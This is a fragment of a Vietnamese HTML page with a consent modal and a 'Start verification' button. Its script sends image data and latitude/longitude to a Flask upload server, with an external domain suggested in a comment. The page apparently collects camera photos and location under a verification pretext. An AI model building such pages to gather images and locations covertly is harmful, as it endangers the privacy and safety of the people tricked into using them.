...
<body>
  ...
  <div id="consentModal">
    <div class="modal-content">
      ...
      <div class="modal-buttons">
        <button id="cancelButton" type="button">Từ chối</button>
        <button id="acceptButton" type="button" disabled>Đồng ý và tiếp tục</button>
      </div>
    </div>
  </div>
  
  <div class="container">
    <button id="startButton" type="button">Bắt đầu xác minh</button>
    <p class="privacy-note">
      🔐 Dữ liệu của bạn được bảo mật theo chính sách quyền riêng tư
    </p>
  </div>
  ...
  <script>
    ...
    function sendData(imageData, lat, lon) {
      ...
      // ⚠️ THAY ĐỔI URL NÀY THÀNH SERVER FLASK CỦA BẠN
      const serverUrl = 'http://localhost:5000/upload'; // Hoặc https://honghotduongpho.cloud/upload
